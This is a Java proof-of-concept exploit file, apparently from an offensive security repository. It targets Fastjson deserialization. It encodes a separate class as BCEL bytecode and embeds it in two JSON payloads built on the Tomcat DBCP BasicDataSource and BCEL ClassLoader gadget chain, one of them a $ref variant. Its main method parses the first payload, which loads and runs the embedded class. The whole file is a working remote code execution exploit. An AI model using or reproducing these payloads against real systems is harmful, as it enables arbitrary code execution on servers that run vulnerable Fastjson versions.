package attack.fastjson.exp;

import com.alibaba.fastjson.JSON;
import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
//import org.apache.tomcat.dbcp.dbcp2.BasicDataSource;
import evalclass.TEMPOC;

class bcel {
    static String getPayload()throws Exception{
        JavaClass cls = Repository.lookupClass(TEMPOC.class);
        String code = Utility.encode(cls.getBytes(), true);//转换为字节码并编码为bcel字节码

        String poc = "{\n" +
                "    {\n" +
                "        \"aaa\": {\n" +
                "                \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\": \"$$BCEL$$"+ code+ "\"\n" +
                "        }\n" +
                "    }: \"bbb\"\n" +
                "}";
        String poc2 = "{\n" +
                "    \"name\":\n" +
                "    {\n" +
                "        \"@type\" : \"java.lang.Class\",\n" +
                "        \"val\"   : \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\"\n" +
                "    },\n" +
                "    \"x\" : {\n" +
                "        \"name\": {\n" +
                "            \"@type\" : \"java.lang.Class\",\n" +
                "            \"val\"   : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "        },\n" +
                "        \"y\": {\n" +
                "            \"@type\":\"com.alibaba.fastjson.JSONObject\",\n" +
                "            \"c\": {\n" +
                "                \"@type\":\"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n" +
                "                \"driverClassLoader\": {\n" +
                "                    \"@type\" : \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n" +
                "                },\n" +
                "                \"driverClassName\":\""+code+"\",\n" +
                "\n" +
                "                     \"$ref\": \"$.x.y.c.connection\"\n" +
                "\n" +
                "            }\n" +
                "        }\n" +
                "    }\n" +
                "}";
        System.out.println(poc);
        return poc;
    }
    public static void main(String[] argv) throws Exception{
        String exp = bcel.getPayload();
        JSON.parse(exp);
    }
}
